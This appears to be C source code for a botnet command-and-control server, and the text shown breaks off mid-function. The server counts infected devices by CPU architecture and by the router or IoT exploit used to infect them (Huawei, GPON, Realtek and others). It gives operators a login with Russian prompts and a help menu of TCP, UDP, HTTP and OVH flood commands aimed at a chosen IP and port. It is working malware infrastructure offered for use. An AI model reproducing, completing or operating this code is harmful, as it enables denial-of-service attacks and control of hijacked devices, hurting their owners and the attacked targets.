#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <unistd.h>

#define MAXFDS 1000000
char usernamez[80];
struct login_info {
    char username[100];
    char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
    uint32_t ip;
    char x86;
    char x86_32;
    char arm4;
    char arm5;
    char arm6;
    char arm7;
    char mips;
    char mpsl;
    char sh4;
    char powerpc;
    char sparc;
    char m68k;
    char arc;
    char unk;
    // exploits chars
    char huawei;
    char linksys;
    char tenda;
    char gpon8080;
    char gpon80;
    char gpon443;
    char uchttpd;
    char coap;
    char adb;
    char dlink;
    char realtek;


    char build[7];
    char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
    int total = 0, got = 1;
    while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
}

void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd) {
    int flags, s;
    flags = fcntl(sfd, F_GETFL, 0);
    if (flags == -1) {
        perror("fcntl");
        return -1;
    }
    flags |= O_NONBLOCK;
    s = fcntl(sfd, F_SETFL, flags);
    if (s == -1) {
        perror("fcntl");
        return -1;
    }
    return 0;
}

static int create_and_bind(char *port) {
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);
    if (s != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
        s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0) {
            break;
        }
        close(sfd);
    }
    if (rp == NULL) {
        fprintf(stderr, "Could not bind\n");
        return -1;
    }
    freeaddrinfo(result);
    return sfd;
}

void broadcast(char *msg, int us, char *sender) {
    int sendMGM = 1;
    if (strcmp(msg, "PING") == 0) sendMGM = 0;
    char *wot = malloc(strlen(msg) + 10);
    memset(wot, 0, strlen(msg) + 10);
    strcpy(wot, msg);
    trim(wot);
    time_t rawtime;
    struct tm *timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    char *timestamp = asctime(timeinfo);
    trim(timestamp);
    int i;
    for (i = 0; i < MAXFDS; i++) {
        if (i == us || (!clients[i].connected)) continue;
        if (sendMGM && managements[i].connected) {
            send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
            send(i, sender, strlen(sender), MSG_NOSIGNAL);
            send(i, ": ", 2, MSG_NOSIGNAL);
        }
        send(i, msg, strlen(msg), MSG_NOSIGNAL);
        send(i, "\n", 1, MSG_NOSIGNAL);
    }
    free(wot);
}

void *BotEventLoop(void *useless) {
    struct epoll_event event;
    struct epoll_event *events;
    int s;
    events = calloc(MAXFDS, sizeof event);
    while (1) {
        int n, i;
        n = epoll_wait(epollFD, events, MAXFDS, -1);
        for (i = 0; i < n; i++) {
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
                clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].x86_32 = 0;
                clients[events[i].data.fd].arm4 = 0;
                clients[events[i].data.fd].arm5 = 0;
                clients[events[i].data.fd].arm6 = 0;
                clients[events[i].data.fd].arm7 = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].sh4 = 0;
                clients[events[i].data.fd].powerpc = 0;
                clients[events[i].data.fd].sparc = 0;
                clients[events[i].data.fd].m68k = 0;
                clients[events[i].data.fd].arc = 0;
                clients[events[i].data.fd].unk = 0;
                // exploits clients events
                clients[events[i].data.fd].huawei = 0;
                clients[events[i].data.fd].linksys = 0;
                clients[events[i].data.fd].tenda = 0;
                clients[events[i].data.fd].gpon8080 = 0;
                clients[events[i].data.fd].gpon80 = 0;
                clients[events[i].data.fd].gpon443 = 0;
                clients[events[i].data.fd].uchttpd = 0;
                clients[events[i].data.fd].coap = 0;
                clients[events[i].data.fd].adb = 0;
                clients[events[i].data.fd].dlink = 0;
                clients[events[i].data.fd].realtek = 0;
                close(events[i].data.fd);
                continue;
            } else if (listenFD == events[i].data.fd) {
                while (1) {
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd, ipIndex;

                    in_len = sizeof in_addr;
                    infd = accept(listenFD, &in_addr, &in_len);
                    if (infd == -1) {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else {
                            perror("accept");
                            break;
                        }
                    }

                    clients[infd].ip = ((struct sockaddr_in *) &in_addr)->sin_addr.s_addr;
                    int dup = 0;
                    for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
                        if (!clients[ipIndex].connected || ipIndex == infd) continue;
                        if (clients[ipIndex].ip == clients[infd].ip) {
                            dup = 1;
                            break;
                        }
                    }
                    if (dup) {
                        if (send(infd, "!* P\n", 13, MSG_NOSIGNAL) == -1) {
                            close(infd);
                            continue;
                        }
                        close(infd);
                        continue;
                    }
                    s = make_socket_non_blocking(infd);
                    if (s == -1) {
                        close(infd);
                        break;
                    }
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
                    if (s == -1) {
                        perror("epoll_ctl");
                        close(infd);
                        break;
                    }
                    clients[infd].connected = 1;
                }
                continue;
            } else {
                int datafd = events[i].data.fd;
                struct clientdata_t *client = &(clients[datafd]);
                int done = 0;
                client->connected = 1;
                client->x86 = 0;
                client->x86_32 = 0;
                client->arm4 = 0;
                client->arm5 = 0;
                client->arm6 = 0;
                client->arm7 = 0;
                client->mips = 0;
                client->mpsl = 0;
                client->sh4 = 0;
                client->powerpc = 0;
                client->sparc = 0;
                client->m68k = 0;
                client->arc = 0;
                client->unk = 0;
                // exploits clients 
                client->huawei = 0;
                client->linksys = 0;
                client->tenda = 0;
                client->gpon8080 = 0;
                client->gpon80 = 0;
                client->gpon443 = 0;
                client->uchttpd = 0;
                client->coap = 0;
                client->adb = 0;
                client->realtek = 0;
                client->dlink = 0;
                while (1) {
                    ssize_t count;
                    char buf[2048];
                    memset(buf, 0, sizeof buf);
                    while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
                        if (strstr(buf, "\n") == NULL) {
                            done = 1;
                            break;
                        }
                        trim(buf);
                        if (strcmp(buf, "PING") == 0) {
                            if (send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) {
                                done = 1;
                                break;
                            }
                            continue;
                        }
                        if (strstr(buf, "REPORT ") == buf) {
                            char *line = strstr(buf, "REPORT ") + 7;
                            fprintf(telFD, "%s\n", line);
                            fflush(telFD);
                            TELFound++;
                            continue;
                        }
                        if (strstr(buf, "PROBING") == buf) {
                            char *line = strstr(buf, "PROBING");
                            scannerreport = 1;
                            continue;
                        }
                        if (strstr(buf, "REMOVING PROBE") == buf) {
                            char *line = strstr(buf, "REMOVING PROBE");
                            scannerreport = 0;
                            continue;
                        }
                        if (strstr(buf, "1") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Server\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m X86_64\033[1;36m]\n");
                            client->x86 = 1;
                        }
                        if (strstr(buf, "2") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m x86_32\033[1;36m]\n");
                            client->x86_32 = 1;
                        }
                        if (strstr(buf, "3") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m ARM4\033[1;36m]\n");
                            client->arm4 = 1;
                        }
                        if (strstr(buf, "4") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m ARM5\033[1;36m]\n");
                            client->arm5 = 1;
                        }
                        if (strstr(buf, "5") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m ARM6\033[1;36m]\n");
                            client->arm6 = 1;

                              }
                        if (strstr(buf, "6") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m ARM7\033[1;36m]\n");
                            client->arm7 = 1;

                              }
                        if (strstr(buf, "7") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m MIPS\033[1;36m]\n");
                            client->mips = 1;

                              }

                            if (strstr(buf, "8") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m MPSL\033[1;36m]\n");
                            client->mpsl = 1;

                              }
                        if (strstr(buf, "9") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m SH4\033[1;36m]\n");
                            client->sh4 = 1;

                              }
                        if (strstr(buf, "10") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m POWERPC\033[1;36m]\n");
                            client->powerpc = 1;

                              }
                        if (strstr(buf, "11") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m SPARC\033[1;36m]\n");
                            client->sparc = 1;

                              }
                        if (strstr(buf, "13") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m M68K\033[1;36m]\n");
                            client->m68k = 1;
                            
                              }
                        if (strstr(buf, "0") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m UNKNOWN\033[1;36m]\n");
                            client->unk = 1;

                        }

                        // the exploits
                            if (strstr(buf, "101") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m huawei\033[1;36m]\n");
                            client->huawei = 1;

                        }
                        if (strstr(buf, "102") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m linksys\033[1;36m]\n");
                            client->linksys = 1;

                        }
                        if (strstr(buf, "103") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m tenda\033[1;36m]\n");
                            client->tenda = 1;

                        }
                        if (strstr(buf, "104") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m gpon8080\033[1;36m]\n");
                            client->gpon8080 = 1;

                        }
                        if (strstr(buf, "105") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m gpon80\033[1;36m]\n");
                            client->gpon80 = 1;

                        }
                        if (strstr(buf, "106") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m gpon443\033[1;36m]\n");
                            client->gpon443 = 1;

                        }
                        if (strstr(buf, "107") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m uchttpd\033[1;36m]\n");
                            client->uchttpd = 1;

                        }
                        if (strstr(buf, "108") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m coap\033[1;36m]\n");
                            client->coap = 1;

                              }
                        if (strstr(buf, "109") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m adb\033[1;36m]\n");
                            client->adb = 1;

                                }
                        if (strstr(buf, "110") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m realtek\033[1;36m]\n");
                            client->realtek = 1;

                                    }
                        if (strstr(buf, "111") == buf) {
                            printf("\033[1;36m[\033[1;31mразрушение\033[1;36m]\033[1;31m Infected Device\033[1;36m [\033[1;31mArch\033[1;36m:\033[1;31m dlink\033[1;36m]\n");
                            client->dlink = 1;


                        }

                        if (strcmp(buf, "PONG") == 0) {
                            continue;
                        }
                    }
                    if (count == -1) {
                        if (errno != EAGAIN) {
                            done = 1;
                        }
                        break;
                    } else if (count == 0) {
                        done = 1;
                        break;
                    }
                    if (done) {
                        client->connected = 0;
                        client->x86 = 0;
                        client->x86_32 = 0;
                        client->arm4 = 0;
                        client->arm5 = 0;
                        client->arm6 = 0;
                        client->arm7 = 0;
                        client->mips = 0;
                        client->mpsl = 0;
                        client->sh4 = 0;
                        client->powerpc = 0;
                        client->sparc = 0;
                        client->m68k = 0;
                        client->arc = 0;
                        client->unk = 0;
                        // exploits clients 
                        client->huawei = 0;
                        client->linksys = 0;
                        client->tenda = 0;
                        client->gpon8080 = 0;
                        client->gpon80 = 0;
                        client->gpon443 = 0;
                        client->uchttpd = 0;
                        client->coap = 0;
                        client->adb = 0;
                        client->realtek = 0;
                        client->dlink = 0;
                        close(datafd);
                    }
                }
            }
        }
    }
}
unsigned int x86_64Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].x86) continue;
        total++;
    }

    return total;
}

unsigned int x86_32Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].x86_32) continue;
        total++;
    }

    return total;
}

unsigned int arm4Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arm4) continue;
        total++;
    }

    return total;
}

unsigned int arm5Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arm5) continue;
        total++;
    }

    return total;
}

unsigned int arm6Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arm6) continue;
        total++;
    }

    return total;
}

unsigned int arm7Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arm7) continue;
        total++;
    }

    return total;
}

unsigned int mipsConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].mips) continue;
        total++;
    }

    return total;
}

unsigned int mpslConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].mpsl) continue;
        total++;
    }

    return total;
}

unsigned int sh4Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].sh4) continue;
        total++;
    }

    return total;
}

unsigned int powerpcConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].powerpc) continue;
        total++;
    }

    return total;
}

unsigned int sparcConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].sparc) continue;
        total++;
    }

    return total;
}

unsigned int m68kConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].m68k) continue;
        total++;
    }

    return total;
}

unsigned int arcConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arc) continue;
        total++;
    }

    return total;
}

unsigned int unkConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].unk) continue;
        total++;
    }

    return total;
}


unsigned int BotsConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].connected) continue;
        total++;
    }
    return total;
}
// all the fucking exploits for the ebnola coneection are here
unsigned int huaweiConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].huawei) continue;
        total++;
    }

    return total;
}

unsigned int linksysConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].linksys) continue;
        total++;
    }

    return total;
}

unsigned int tendaConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].tenda) continue;
        total++;
    }

    return total;
}

unsigned int gpon8080Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].gpon8080) continue;
        total++;
    }

    return total;
}

unsigned int gpon80Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].gpon80) continue;
        total++;
    }

    return total;
}

unsigned int gpon443Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].arm6) continue;
        total++;
    }

    return total;
}

unsigned int uchttpdConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].uchttpd) continue;
        total++;
    }

    return total;
}

unsigned int coapConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].coap) continue;
        total++;
    }

    return total;
}

    unsigned int realtekConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].realtek) continue;
        total++;
    }

    return total;
}

    unsigned int adbConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].adb) continue;
        total++;
    }

    return total;
}
    unsigned int dlinkConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].dlink) continue;
        total++;
    }

    return total;
}



int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line = 0;
    char temp[512];

    if ((fp = fopen("l.txt", "r")) == NULL) {
        return (-1);
    }
    while (fgets(temp, 512, fp) != NULL) {
        if ((strstr(temp, str)) != NULL) {
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if (fp)
        fclose(fp);
    if (find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
    int datafd = (int) sock;
    int find_line;
    OperatorsConnected++;
    pthread_t title;
    char usernamez[80];
    char buf[2048];
    char *username;
    char *password;
    memset(buf, 0, sizeof buf);
    char botnet[2048];
    memset(botnet, 0, 2048);
    char b[2048];
    memset(b, 0, 2048);
    char botcount[2048];
    memset(botcount, 0, 2048);
    char ep[2048];
    memset(ep, 0, 2048);

    FILE *fp;
    int i=0;
    int c;
    ////////////////////////////////////////////
    fp=fopen("l.txt", "r"); // Login Text 2
    ////////////////////////////////////////////
    while(!feof(fp)) {
        c=fgetc(fp);
        ++i;
    }
    int j=0;
    rewind(fp);
    while(j!=i-1) {
        fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
        ++j;
    }
///////////////////////////////////////////////////////////////////////////////////////////////////////////
        if(send(datafd, "\x1b[1;31imya pol'zovatelya\x1b[1;36m:\x1b[37m ", 27, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
        char* nickstring;
        sprintf(accounts[find_line].username, buf);
             sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
        if(send(datafd, "\x1b[1;31mparol'\x1b[1;36m:\x1b[30m ", 16, MSG_NOSIGNAL) == -1) goto end;
        ////////////////////////////////////////////////////////////////////////////////////////////////////
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto Banner;
    }
    void *TitleWriter(void *sock) {
        int datafd = (int) sock;
        char string[2048];
        while (1) {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; нагруженный %d |имя пользователя %s | %d %c", '\033', BotsConnected(), usernamez, OperatorsConnected, '\007');
            if (send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
            sleep(2);
        }
    }
      failed:
   if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        char failed_line1[80]; //IP Logger Statement
        char failed_line2[80]; //IP Logger Statement

        sprintf(failed_line1, "\x1b[31mДОБРО ПОЖАЛОВАТЬ В ЖИВОЙ АД, ВЫ ДОБАВЛЕНЫ В СПИСОК!\r\n"); //IP Logger Statement

        sprintf(failed_line2, "\x1b[31mВы заразились СПИДом!    \r\n"); //IP Logger Statement
        if(send(datafd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end; //IP Logger Statement
        sleep(5);
        goto end;

    Banner:
    pthread_create(&title, NULL, &TitleWriter, sock);

    char ascii_banner_line1[5000];
    char ascii_banner_line2[5000];
    char ascii_banner_line3[5000];
    char ascii_banner_line4[5000];
    char ascii_banner_line5[5000];
    char ascii_banner_line6[5000];
    char ascii_banner_line7[5000];
    char ascii_banner_line8[5000];

    sprintf(ascii_banner_line1, "\033[1;31m\033[2J\033[1;1H");
    sprintf(ascii_banner_line2, "\033[1;31m\r\n");
    sprintf(ascii_banner_line3, "\033[1;31m\r\n");
    sprintf(ascii_banner_line4, "\033[1;31m\r\n");
    sprintf(ascii_banner_line5, "\033[1;31m\r\n");
    sprintf(ascii_banner_line6, "\033[1;31m\r\n");
    sprintf(ascii_banner_line7, "\033[1;31m\r\n");
    sprintf(ascii_banner_line8, "\033[1;31m\r\n");



    if (send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
    while (1) {
        char input[5000];
        sprintf(input, "\033[1;31m%s\033[1;36m@\033[1;31mразрушение\033[1;36m$\033[1;31m%d\033[1;36m~#\033[1;37m ", usernamez, BotsConnected());
        if (send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
        break;
    }
    managements[datafd].connected = 1;

    while (fdgets(buf, sizeof buf, datafd) > 0) {
        if (strncmp(buf, "HELP", 4) == 0 || strncmp(buf, "help", 4) == 0 || strncmp(buf, "?", 1) == 0 ||
            strncmp(buf, "Help", 4) == 0) {
            char hp1[800];
            char hp2[800];
            char hp3[800];
            char hp4[800];
            char hp5[800];
            char hp6[800];

            sprintf(hp1,
                    "\033[1;31m !* T \033[1;36m[\033[1;31mIP\033[1;36m] [\033[1;31mPORT\033[1;36m] [\033[1;31mTIME\033[1;36m]\033[1;31m 32\033[1;36m A\033[1;31m 0 10\033[1;36m                      |\033[1;37m TCP Attack\r\n");
            sprintf(hp2,
                    "\033[1;31m !* U \033[1;36m[\033[1;31mIP\033[1;36m] [\033[1;31mPORT\033[1;36m] [\033[1;31mTIME\033[1;36m]\033[1;31m 32 1024 10\033[1;36m                     |\033[1;37m UDP Attack\r\n");
            sprintf(hp3,
                    "\033[1;31m !* S \033[1;36m[\033[1;31mIP\033[1;36m] [\033[1;31mPORT\033[1;36m] [\033[1;31mTIME\033[1;36m]\033[1;36m                                |\033[1;37m STD Attack\r\n");
             sprintf(hp4,
                    "\033[1;31m !* O \033[1;36m[\033[1;31mIP\033[1;36m] [\033[1;31mPORT\033[1;36m] [\033[1;31mTIME\033[1;36m]\033[1;36m                                |\033[1;37m OVH Attack\r\n");
            sprintf(hp5,
                    "\033[1;31m !* H \033[1;36m[\033[1;31mIP\033[1;36m] [\033[1;31mPORT\033[1;36m] [\033[1;31mTIME\033[1;36m]\033[1;31m [threads]\033[1;31m [method]\033[1;31m\033[1;36m             |\033[1;37m HTTP Attack\r\n");
            sprintf(hp6,
                    "\033[1;31m !* K                                        \033[1;36m           |\033[1;37m Kills All Attacks\r\n");

            if (send(datafd, hp1, strlen(hp1), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp2, strlen(hp2), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp3, strlen(hp3), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp4, strlen(hp4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp5, strlen(hp5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, hp6, strlen(hp6), MSG_NOSIGNAL) == -1) goto end;
        }
        if (strncmp(buf, "b", 1) == 0 || strncmp(buf, "botcount", 8) == 0) {
            char mips[128];
            char mpsl[128];
            char arm4[128];
            char arm5[128];
            char arm6[128];
            char arm7[128];
            char sh4[128];
            char powerpc[128];
            char m68k[128];
            char arc[128];
            char sparc[128];
            char x86_32[128];
            char x86_64[128];
            char unk[128];
            char total[128];

            sprintf(x86_64, "\033[1;31mx86_64 \033[1;36m~>\033[1;31m %d\r\n", x86_64Connected());
            sprintf(x86_32, "\033[1;31mx86_32 \033[1;36m~>\033[1;31m %d\r\n", x86_32Connected());
            sprintf(arm4, "\033[1;31marm4   \033[1;36m~>\033[1;31m %d\r\n", arm4Connected());
            sprintf(arm5, "\033[1;31marm5   \033[1;36m~>\033[1;31m %d\r\n", arm5Connected());
            sprintf(arm6, "\033[1;31marm6   \033[1;36m~>\033[1;31m %d\r\n", arm6Connected());
            sprintf(arm7, "\033[1;31marm7   \033[1;36m~>\033[1;31m %d\r\n", arm7Connected());
            sprintf(mips, "\033[1;31mmips   \033[1;36m~>\033[1;31m %d\r\n", mipsConnected());
            sprintf(mpsl, "\033[1;31mmpsl   \033[1;36m~>\033[1;31m %d\r\n", mpslConnected());
            sprintf(sh4, "\033[1;31msh4    \033[1;36m~>\033[1;31m %d\r\n", sh4Connected());
            sprintf(powerpc, "\033[1;31mpowerpc\033[1;36m~>\033[1;31m %d\r\n", powerpcConnected());
            sprintf(sparc, "\033[1;31msparc  \033[1;36m~>\033[1;31m %d\r\n", sparcConnected());
            sprintf(m68k, "\033[1;31mm68k   \033[1;36m~>\033[1;31m %d\r\n", m68kConnected());
            sprintf(arc, "\033[1;31marc    \033[1;36m~>\033[1;31m %d\r\n", arcConnected());
            sprintf(unk, "\033[1;31munk    \033[1;36m~>\033[1;31m %d\r\n", unkConnected());
            sprintf(total, "\033[1;31mtotal  \033[1;36m~>\033[1;31m %d\r\n", BotsConnected());
            if (send(datafd, x86_64, strlen(x86_64), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, x86_32, strlen(x86_32), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, arm4, strlen(arm4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, arm5, strlen(arm5), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, arm6, strlen(arm6), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, arm7, strlen(arm7), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, mips, strlen(mips), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, mpsl, strlen(mpsl), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, sh4, strlen(sh4), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, m68k, strlen(m68k), MSG_NOSIGNAL) == -1) goto end;
            if (send(datafd, powerpc, strlen(powerpc), MSG_NOSIGNAL) == -1) goto end;
